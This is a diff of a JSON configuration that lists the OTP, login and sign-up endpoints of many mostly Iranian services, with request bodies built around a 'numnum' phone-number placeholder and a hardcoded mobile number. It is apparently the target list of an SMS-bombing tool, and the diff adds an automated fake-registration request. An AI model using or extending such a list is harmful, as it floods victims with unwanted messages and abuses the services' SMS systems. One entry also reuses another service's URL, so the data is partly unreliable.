@@ -2,54 +2,82 @@
     "rirabook": {
         "url": "https://rirabook.com/loginAth",
         "data": {
-            "mobile1" : "numnum",
-            "loginbt1" : ""
+            "mobile1": "numnum",
+            "loginbt1": ""
         }
     },
 
-    "snappfood": {
-        "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=23edaab7-b7a3-4c6f-8046-665d0f8ff3be&locale=fa        ",
+    "iranjahanpoosh": {
+        "url": "https://iranjahanpoosh.com/wp-admin/admin-ajax.php",
         "data": {
-            "cellphone" : "09050756226"
+            "digt_countrycode": "%2B98",
+            "phone": "9050756226",
+            "digits_reg_name": "namename",
+            "digits_reg_password": "asdasdasdasd",
+            "digits_process_register": "1",
+            "instance_id": "355dbb36c6e4eb225d81183a543dbbe1",
+            "optional_data": "optional_data",
+            "action": "digits_forms_ajax",
+            "type": "register",
+            "dig_otp": "",
+            "digits": "1",
+            "digits_redirect_page": "-1",
+            "digits_form": "859b4679af",
+            "_wp_http_referer": "%2F%3Flogin%3Dtrue%26page%3D1%26redirect_to%3Dhttps%253A%252F%252Firanjahanpoosh.com%252F"
+        }
+    },
+
+    "kellowear": {
+        "url": "https://kellowear.com/api/v1/sessions/login_request",
+        "data": {
+            "mobile_phone": "09050756226"
+        }
+    },
+
+
+    "snappfood": {
+        "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=23edaab7-b7a3-4c6f-8046-665d0f8ff3be&locale=fa",
+        "data": {
+            "cellphone": "09050756226"
         }
     },
 
     "snapp": {
         "url": "https://api.snapp.ir/api/v1/sms/link",
         "data": {
-            "phone" : "09050756226"
+            "phone": "09050756226"
         }
     },
 
 
     "SMS.ir": {
-	    "url" : "https://app.sms.ir/auth/sign-up?mobile=numnum",
-	    "data" : {
-	        "mobile" : "numnum"
+	    "url": "https://app.sms.ir/auth/sign-up?mobile=numnum",
+	    "data": {
+	        "mobile": "numnum"
     	}
     },
 
     "vipshop": {
-        "url" : "https://vipshop.flowers/wp-admin/admin-ajax.php",
-        "data" : {
-            "action" : "logini_first",
-            "login" : "numnum"
+        "url": "https://vipshop.flowers/wp-admin/admin-ajax.php",
+        "data": {
+            "action": "logini_first",
+            "login": "numnum"
         }
 
     },
 
-    "digikala" : {
-        "url" : "https://api.digikala.com/v1/user/authenticate/",
-        "data" : {
-            "backUrl" : "/",
-            "otp_call" : "false",
-            "username" : "numnum"
+    "digikala": {
+        "url": "https://api.digikala.com/v1/user/authenticate/",
+        "data": {
+            "backUrl": "/",
+            "otp_call": "false",
+            "username": "numnum"
         }
     },
 
-    "okala" : {
-        "url" : "https://api-react.okala.com/C/CustomerAccount/OTPRegister",
-        "data" : {
+    "okala": {
+        "url": "https://api-react.okala.com/C/CustomerAccount/OTPRegister",
+        "data": {
             "confirmTerms": "true",
             "deviceTypeCode": "0",
             "mobile": "numnum",
@@ -57,42 +85,42 @@
         }
     },
 
-    "basalam" : {
-        "url" : "https://api-react.okala.com/C/CustomerAccount/OTPRegister",
-        "data" : {
+    "basalam": {
+        "url": "https://api-react.okala.com/C/CustomerAccount/OTPRegister",
+        "data": {
             "client_id": "11",
             "mobile": "numnum"
         }
     },
 
-    "bamiloshop" : {
-        "url" : "https://apollo.digify.shop/graphql",
-        "data" : {
+    "bamiloshop": {
+        "url": "https://apollo.digify.shop/graphql",
+        "data": {
             "operationName":"OtpSendV2",
-            "variables":{
+            "variables": {
                 "content": {
-                    "phone_number":"numnum",
-                    "is_forget_password":false
+                    "phone_number": "numnum",
+                    "is_forget_password": "false"
                     }
                 },
-            "query":"mutation OtpSendV2($content: OTPSendContent) {\n  customer {\n    otpSendV2(content: $content) {\n      is_forget_password\n      is_register\n      __typename\n    }\n    __typename\n  }\n}"
+            "query": "mutation OtpSendV2($content: OTPSendContent) {\n  customer {\n    otpSendV2(content: $content) {\n      is_forget_password\n      is_register\n      __typename\n    }\n    __typename\n  }\n}"
         }
     },
 
     "banimode": {
-	    "url" : "https://mobapi.banimode.com/api/v2/auth/request",
-        "data" : {
+	    "url": "https://mobapi.banimode.com/api/v2/auth/request",
+        "data": {
             "phone": "numnum"
         }
     },
     
 
     "doctoreto": {
-	    "url" : "https://api.doctoreto.com/api/web/patient/v1/accounts/register",
-        "data" : {
-            "mobile":"numnum",
-            "country_id":"205",
-            "captcha":""
+	    "url": "https://api.doctoreto.com/api/web/patient/v1/accounts/register",
+        "data": {
+            "mobile": "numnum",
+            "country_id": "205",
+            "captcha": ""
         }
     }
 
